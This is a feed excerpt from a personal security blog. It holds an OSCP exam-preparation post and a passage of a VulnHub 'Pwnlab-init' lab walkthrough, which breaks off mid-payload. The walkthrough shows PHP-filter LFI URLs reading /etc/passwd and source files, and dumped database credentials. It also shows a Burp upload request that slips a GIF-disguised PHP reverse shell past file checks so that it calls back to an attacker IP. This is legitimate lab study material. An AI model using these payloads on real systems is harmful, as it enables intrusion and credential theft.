        <link rel="alternate" href="https://johntuyen.com/posts/personal-oscpexperience/" type="text/html"/>
        <id>https://johntuyen.com/posts/personal-oscpexperience/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;personal-oscpexperience&#x2F;oscp-cover.png&quot; alt=&quot;cover&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;OSCP is widely regarded as a difficult certificate to achieve and I understand why people would see it that way. There are not many certificates that requires passing a 24-hour hands-on exam. I&#x27;ve spent around 300+ hours in the past 3 months preparing for this exam and managed to &lt;a href=&quot;https:&#x2F;&#x2F;www.youracclaim.com&#x2F;badges&#x2F;1a8cddb7-4bb5-4cf9-acce-f6053f08f494&quot;&gt;pass&lt;&#x2F;a&gt; on my first attempt with 80&#x2F;100 points. Was it easy? Absolutely not. Don&#x27;t be scared though, I&#x27;m sharing my ways to optimize your time and experience when taking OSCP.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;skills-and-resources&quot;&gt;Skills and resources&lt;&#x2F;h3&gt;
&lt;p&gt;Coding experience is not really required but will help with reading exploits easier. I would recommend doing a quick python tutorial on codeacademy and get familiar with syntax and loops. Knowing a little bit of bash would help as well but not required.&lt;&#x2F;p&gt;
&lt;p&gt;If you don&#x27;t have a strong IT background, read Georgia Weidman&#x27;s book on penetration testing. It&#x27;s a classic on what will entail when working through the OSCP labs and exam. Another recommendation is go through INE&#x27;s OSCP course, it will give you an insight on what the OSCP course material is like and can be a good complementary material for the actual course.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;building-confidence&quot;&gt;Building confidence&lt;&#x2F;h3&gt;
&lt;p&gt;Try doing some of vulnerable machines listed on &lt;a href=&quot;http:&#x2F;&#x2F;www.vulnhub.com&quot;&gt;vulnhub&lt;&#x2F;a&gt;. I would advise doing some of the easier machines like Kioptrix and Mr Robot. Try attempting these machines with best of your abilities. If you get stuck, make a guess of where the vulnerability possibly be found and read some of the walkthrough guides as hints until eventually you reach root access. I know a lot of people who would speed through these walkthroughs or use them as crutches, don&#x27;t do this. The point of reading walkthrough guides is seeing if you are on the right direction &lt;em&gt;after&lt;&#x2F;em&gt; spending countless of hours on a single problem. You need to train your brain to think like a hacker, a lot of hard work, discipline and time is required to think like one. Don&#x27;t sell yourself short.&lt;&#x2F;p&gt;
&lt;p&gt;Lastly, know that it&#x27;s not so much about the techniques you need to learn, it&#x27;s all about learning the methodology that offsec is trying to teach. Coming from an system administration background did help a bit during my OSCP studies but honestly, it&#x27;s all about paying attention to what you are reading and &amp;quot;trying harder&amp;quot; to find relevant information to help you steer in the right direction.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;i-don-t-have-time-to-study&quot;&gt;&amp;quot;I don&#x27;t have time to study&amp;quot;&lt;&#x2F;h3&gt;
&lt;p&gt;Studying for the OSCP is not something you do with minimal effort. Depending on how much experience you have in IT, you probably will have to spend 2-3 hours every night and 4-6 on the weekends for 1-3 months depending on the lab time you bought. The number of hours you spend on studying and preparing for the OSCP will reveal itself during the exam. Don&#x27;t try to cram or speed through the labs. I&#x27;ve seen people finish all of the lab machines and still fail the exam.&lt;&#x2F;p&gt;
&lt;p&gt;In addition, once the OSCP lab time expires, you may want to continue sharpening your skills using penetration platforms such as vulnhub or hackthebox. If you do spend time on hackthebox, I would recommend watching ippsec on youtube to see how an experienced penetration tester approaches with problem solving. Take time to write down notes as his methodology will give you insights about your own flawed methodology.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;maximizing-lab-time&quot;&gt;Maximizing lab time&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;The labs are there for you to explore&lt;&#x2F;strong&gt; and soak in the hard work of your successes and failures. From what I&#x27;ve seen so far, the average person that passes the exam has rooted about 30 lab machines. I found this to be true as well for myself as I only had purchased 60 days lab time. There are outliers who only rooted 10 machines and still manage to pass on the first attempt. What I&#x27;m trying to tell you is, how many machines you rooted will not matter. It&#x27;s about what you have learned during the labs and how your thought processes have changed the way you think when approaching problems. As simple as that sounds, it won&#x27;t be easy and will require plenty of hard work, dedication and frustration.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Practice taking notes&lt;&#x2F;strong&gt; while working on the labs. Your notes will be clunky at first because either you copy and paste things that aren&#x27;t useful, or not taking down notes at all when it&#x27;s needed. Taking notes will give you a structure of how you think, what you have done so far, and if you get stuck, you can review your notes and see what the overall machine looks like and may give you an idea on approaching the problem differently.&lt;&#x2F;p&gt;
&lt;p&gt;If you get stuck on a machine after working on it for a hours, it can be helpful to &lt;strong&gt;take a peek for hints&lt;&#x2F;strong&gt; on the offsec forums. Just so you know, the hints given are cryptic and sometimes confusing which makes the situation more confusing. If you don&#x27;t know what the hint is about, write it down on your notes and work on the problem later. Sometimes your brain just needs a break and focus on something else.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Don&#x27;t become too reliant on hints&lt;&#x2F;strong&gt; and before you take a peek, have a guess of what you think the vulnerability could be and if there is anything you can do to confirm your hypothesis. For instance, you got a PoC that does RCE, can you perform a simple experiment that confirms the RCE such as a ping back? How would you confirm if you have received ICMP packets? Breaking down the steps into managable pieces is immensely helpful because you will run into plenty of troubleshooting of PoC code that you don&#x27;t have full understanding of.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Creating your own checklist&lt;&#x2F;strong&gt; shows your current understanding of what your methodology and knowledge looks like. I would advise updating this checklist as you move along in the labs. By the end the labs, you will see that your checklist is like a mindmap of what you did and learned. This checklist will be helpful during the exam to keep you sane in the enumeration process.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Create your own cheatsheet&lt;&#x2F;strong&gt; so you can quickly refer frequently used commands such as nmap. A quick Google search will show many OSCP cheatsheets available but you should make your own because it will retain in your memory better. I personally used Dokuwiki to store my cheatsheet and works wonderfully. The great part about Dokuwiki is it saves pages as plain text. I can easily export the document and convert to markdown if needed. If you use a text editor like vim, you can easily edit the pages all in command line if that&#x27;s your thing. Lastly, you don&#x27;t need to run a web server to host dokuwiki, you can run the docker image on your local machine.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, &lt;strong&gt;don&#x27;t use kernel exploits to root machines&lt;&#x2F;strong&gt;. There is only 1 machine on the labs that are designed to be kernel exploited. As I&#x27;ve said before, rooting all lab machines isn&#x27;t the objective. Taking the time to learn the pentesting methodology and understanding your own flaws is the biggest take away from the labs. Discovering your flaws will save time from falling into rabbit holes. You will get better at not falling into rabbit holes over time as you will see the repeating pattern for failures.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;exam-tips&quot;&gt;Exam tips&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;Manage your time is #1 priority&lt;&#x2F;strong&gt;. It&#x27;s a 24-hour exam but in reality, it&#x27;s only 16-17 workable hours due to sleep&#x2F;naps. No sleep = death. There are 5 machines in the exam. 2x 25pts, 2x 20pts, 1x 10pts. The BoF (25pts) should take about 2 hours and the 10 pointer should take another hour. Roughly, you have about 13-14 hours to work on the other 3 machines so that&#x27;s about 4 hours per machine. Keep track of how much time you are spending per machine. If you get stuck for awhile, move on to the next machine and come back to it later.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;If you have a computer with beefy specs, use it&lt;&#x2F;strong&gt;. If you don&#x27;t, consider stopping or removing unnecessary running background services. During the exam, you are required by offsec&#x27;s proctor to run screen sharing and web cam software, it can be quite a memory hog and CPU intensive. My 2015 Macbook Pro with 8GB specs running Kali VM was barely chugging along. My fan and CPU was running at 80-90% utilization for the entire exam. I had a bit of lag in between mouse clicks and typing. Not the greatest experience but it can be way better if you had a performance machine to work with. Lastly, I&#x27;ve seen people use screen recording software during the exam, I heard it&#x27;s allowed but not officially. It would be useful to record your screen to capture screenshots that you may have missed.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Use a tool to automate your enumeration process&lt;&#x2F;strong&gt;. I used &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Tib3rius&#x2F;AutoRecon&quot;&gt;AutoRecon&lt;&#x2F;a&gt; and it was great for the labs and helpful in the exam as it will run scans in the background while you are working on a machine.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Exercise, snacks, water, and bathroom breaks&lt;&#x2F;strong&gt;. Do I need to say more about this? Take care of yourself. A 30-minute run or exercise before the exam would be helpful for the brain.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;You managed to get enough points and passed?&lt;&#x2F;strong&gt; Great! Have a short celebration as it&#x27;s only half the battle, get ready to be even more scared. I hope you taken enough screenshots required to write your report or it&#x27;s a big fat zero. Did you follow your methodology and checklist? Yes? Well you don&#x27;t need to be scared, you learned the ways of being a penetration tester. Congrats! Writing the report can be scary because there are many little details required for the report. I&#x27;ve read stories about how someone failed their exam because they submitted the report with an incorrect filename and&#x2F;or format even when he&#x2F;she scored 100%. Don&#x27;t let this happen to you, read the report requirements in detail and many times as you need.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Enjoy your exam&lt;&#x2F;strong&gt;. I know that sounds ridiculous because exams are suppose to be stressful right? The way I see it is, if you spent a good chunk of time studying OSCP, your knowledge and skills should have improved immensely since you&#x27;ve started. Passing and failing the exam doesn&#x27;t matter, as long as you care about improving yourself everyday. Even if you failed, you are still better than yesterday. There will always be another chance of taking the exam, but the time loss from not improving yourself is lost forever.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;life-after-oscp&quot;&gt;Life after OSCP&lt;&#x2F;h3&gt;
&lt;p&gt;I didn&#x27;t stop at OSCP, neither should you. OSCP is considered to be a beginners pentesting certification believe it or not. It&#x27;s only a part of what infosec is really about. Attacking a network is one piece of the puzzle, defending is another. I&#x27;m currently learning about the defensive side as the job market has a need for penetration testers that specializes for both sides. &lt;&#x2F;p&gt;
&lt;p&gt;While OSCP is great to have, what it lacks is real world and up to date lab machines. Although, I would think offsec would disagree with my statement because they wanted to teach the fundamentals and methodology rather than focusing on the technology piece. In the real world, you need to learn about protecting Active Directory and cloud services. This is what I&#x27;m currently focusing on and it&#x27;s not easy.&lt;&#x2F;p&gt;
&lt;p&gt;Finding work in infosec is difficult if you don&#x27;t have much experience in infosec even though you have plenty of IT experience. I&#x27;m trying to break into infosec and I haven&#x27;t had much luck. It&#x27;s not easy in this slow job market even if you have OSCP. Although, my job search is getting better lately after I creating this website to display my work and experiences.&lt;&#x2F;p&gt;
&lt;p&gt;Best of luck with OSCP and keep on learning!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Pwnlab-init</title>
        <published>2019-05-16T00:00:00+00:00</published>
        <updated>2019-05-16T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/vulnhub-pwnlabinit/" type="text/html"/>
        <id>https://johntuyen.com/posts/vulnhub-pwnlabinit/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;There are two ports that you can attack remotely, port 80 and 3306.&lt;&#x2F;p&gt;
&lt;p&gt;Port 80 attacks:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Tried simple passwords to attempt bypass login.&lt;&#x2F;li&gt;
&lt;li&gt;No luck with RFI attack.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Port 3306 attacks:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;No luck with bruteforcing MySQL login using &lt;code&gt;rockyou.txt&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I should be more careful with reading and php filter LFI attack. At the end of the URL, you notice in LFI cheatsheets, it will show &lt;code&gt;&#x2F;etc&#x2F;passwd&lt;&#x2F;code&gt; such as:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.155.131&#x2F;fileincl&#x2F;example1.php?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;You don&#x27;t necessarily need the directory traversal to test if you can execute the php filter attack. You can first query the index page and see if it works first then traverse the directories and see if you can gather system files.&lt;&#x2F;p&gt;
&lt;p&gt;I&#x27;ve decoded the following files for further inspection:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.1.16&#x2F;?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=index
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.1.16&#x2F;?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=login
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.1.16&#x2F;?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=upload
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.1.16&#x2F;?page=php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource=config
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-pwnlabinit&#x2F;pwnlab-lfi.png&quot; alt=&quot;pwnlab-lfi.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The config page makes sense now because when navigating to the config.php page, it will show up as blank and in the next step it explains why.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;config.php&lt;&#x2F;code&gt; page contains the MySQL credentials.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;server	  &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;localhost&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;H4u%QJ_H99&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;database &lt;&#x2F;span&gt;&lt;span&gt;= &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Users&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using &lt;code&gt;mysql&lt;&#x2F;code&gt; and connect to the remote database as root. Once logged in, there is a database named users and below is the output of the database. The password is encoded with base64 format.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span&gt;MySQL [Users]&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;select &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span&gt; users;
&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;------+------------------+
&lt;&#x2F;span&gt;&lt;span&gt;| user | pass             |
&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;------+------------------+
&lt;&#x2F;span&gt;&lt;span&gt;| kent | Sld6WHVCSkpOeQ== (JWzXuBJJNy) |
&lt;&#x2F;span&gt;&lt;span&gt;| mike | U0lmZHNURW42SQ== (SIfdsTEn6I) |
&lt;&#x2F;span&gt;&lt;span&gt;| kane | aVN2NVltMkdSbw== (iSv5Ym2GRo) |
&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;------+------------------+
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt; rows in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;01&lt;&#x2F;span&gt;&lt;span&gt; sec)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Open up Burpsuite and create a repeater with this snippet below. There are 3 important parts of this snippet. &lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.gif&lt;&#x2F;code&gt; extension - To bypass the listed whitelist extensions.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;image&#x2F;gif&lt;&#x2F;code&gt; as content type - To bypass the mime type checker.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;GIF87a&lt;&#x2F;code&gt; header before the php tag - To fake the server thinking the file really is receiving a gif format by checking the file header.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Executing the custom Burpsuite remote command to the server will generate a broken image link.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;POST &#x2F;?page=upload HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.16.129
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (X11; Linux i686; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0
&lt;&#x2F;span&gt;&lt;span&gt;Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q=0.9,*&#x2F;*;q=0.8
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: en-US,en;q=0.5
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.16.129&#x2F;?page=upload
&lt;&#x2F;span&gt;&lt;span&gt;Cookie: PHPSESSID=9vq5im5401eplh2imdb7tjoar0
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;Upgrade-Insecure-Requests: 1
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: multipart&#x2F;form-data; boundary=---------------------------6484244853519591111205641705
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 5848
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;-----------------------------6484244853519591111205641705
&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;php-reverse-shell.gif&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: image&#x2F;gif
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;GIF87a
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;set_time_limit (0);
&lt;&#x2F;span&gt;&lt;span&gt;$VERSION = &amp;quot;1.0&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;$ip = &amp;#39;192.168.16.130&amp;#39;;  &#x2F;&#x2F; CHANGE THIS
&lt;&#x2F;span&gt;&lt;span&gt;$port = 4444;       &#x2F;&#x2F; CHANGE THIS
&lt;&#x2F;span&gt;&lt;span&gt;$chunk_size = 1400;
&lt;&#x2F;span&gt;&lt;span&gt;$write_a = null;
&lt;&#x2F;span&gt;&lt;span&gt;$error_a = null;
&lt;&#x2F;span&gt;&lt;span&gt;$shell = &amp;#39;uname -a; w; id; &#x2F;bin&#x2F;sh -i&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;$daemon = 0;
&lt;&#x2F;span&gt;&lt;span&gt;$debug = 0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Daemonise ourself if possible to avoid zombies later
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; pcntl_fork is hardly ever available, but will allow us to daemonise
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; our php process and avoid zombies.  Worth a try...
&lt;&#x2F;span&gt;&lt;span&gt;if (function_exists(&amp;#39;pcntl_fork&amp;#39;)) {
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Fork and have the parent process exit
&lt;&#x2F;span&gt;&lt;span&gt;	$pid = pcntl_fork();
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	if ($pid == -1) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;ERROR: Can&amp;#39;t fork&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	if ($pid) {
&lt;&#x2F;span&gt;&lt;span&gt;		exit(0);  &#x2F;&#x2F; Parent exits
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Make the current process a session leader
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Will only succeed if we forked
&lt;&#x2F;span&gt;&lt;span&gt;	if (posix_setsid() == -1) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;Error: Can&amp;#39;t setsid()&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	$daemon = 1;
&lt;&#x2F;span&gt;&lt;span&gt;} else {
&lt;&#x2F;span&gt;&lt;span&gt;	printit(&amp;quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Change to a safe directory
&lt;&#x2F;span&gt;&lt;span&gt;chdir(&amp;quot;&#x2F;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Remove any umask we inherited
&lt;&#x2F;span&gt;&lt;span&gt;umask(0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Do the reverse shell...
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Open reverse connection
&lt;&#x2F;span&gt;&lt;span&gt;$sock = fsockopen($ip, $port, $errno, $errstr, 30);
&lt;&#x2F;span&gt;&lt;span&gt;if (!$sock) {
&lt;&#x2F;span&gt;&lt;span&gt;	printit(&amp;quot;$errstr ($errno)&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;	exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Spawn shell process
&lt;&#x2F;span&gt;&lt;span&gt;$descriptorspec = array(
&lt;&#x2F;span&gt;&lt;span&gt;   0 =&amp;gt; array(&amp;quot;pipe&amp;quot;, &amp;quot;r&amp;quot;),  &#x2F;&#x2F; stdin is a pipe that the child will read from
&lt;&#x2F;span&gt;&lt;span&gt;   1 =&amp;gt; array(&amp;quot;pipe&amp;quot;, &amp;quot;w&amp;quot;),  &#x2F;&#x2F; stdout is a pipe that the child will write to
&lt;&#x2F;span&gt;&lt;span&gt;   2 =&amp;gt; array(&amp;quot;pipe&amp;quot;, &amp;quot;w&amp;quot;)   &#x2F;&#x2F; stderr is a pipe that the child will write to
&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;$process = proc_open($shell, $descriptorspec, $pipes);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;if (!is_resource($process)) {
&lt;&#x2F;span&gt;&lt;span&gt;	printit(&amp;quot;ERROR: Can&amp;#39;t spawn shell&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;	exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Set everything to non-blocking
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Reason: Occsionally reads will block, even though stream_select tells us they won&amp;#39;t
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($pipes[0], 0);
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($pipes[1], 0);
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($pipes[2], 0);
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($sock, 0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;printit(&amp;quot;Successfully opened reverse shell to $ip:$port&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;while (1) {
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Check for end of TCP connection
&lt;&#x2F;span&gt;&lt;span&gt;	if (feof($sock)) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;ERROR: Shell connection terminated&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		break;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Check for end of STDOUT
&lt;&#x2F;span&gt;&lt;span&gt;	if (feof($pipes[1])) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;ERROR: Shell process terminated&amp;quot;);
